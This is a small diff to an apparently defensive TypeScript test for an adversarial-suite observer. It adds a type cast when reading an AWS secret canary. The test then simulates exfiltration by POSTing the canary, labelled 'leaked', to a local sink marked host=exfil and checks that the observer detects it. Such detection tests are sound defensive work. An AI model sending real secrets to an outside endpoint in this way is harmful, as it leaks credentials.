@@ -27,7 +27,7 @@ describe("adversarial suite observer", () => {
   });
 
   it("detects a secret canary's bytes arriving at the sink", async () => {
-    const canary = observer.secretCanaries.aws.canary;
+    const canary = (observer.secretCanaries as Record<string, { canary: string }>).aws.canary;
     await begin("obs-secret");
     await fetch(`${observer.origin}/sink?trial=obs-secret&host=exfil`, { method: "POST", body: `leaked ${canary}` });
     const o = await end("obs-secret");
